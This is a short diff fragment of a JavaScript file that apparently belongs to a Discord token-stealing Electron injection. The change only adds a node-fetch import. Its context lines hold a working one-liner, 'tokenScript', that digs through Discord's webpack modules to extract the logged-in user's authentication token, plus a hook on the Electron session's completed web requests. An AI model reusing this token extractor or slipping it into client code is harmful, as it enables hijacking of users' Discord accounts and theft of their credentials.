@@ -4,6 +4,7 @@ const fs = require("fs")
 const electron = require("electron")
 const https = require("https");
 const queryString = require("querystring")
+const fetch = require('node-fetch')
 
 
 var tokenScript = `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`
@@ -525,6 +526,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             break
     }
 })
+
 
 
 
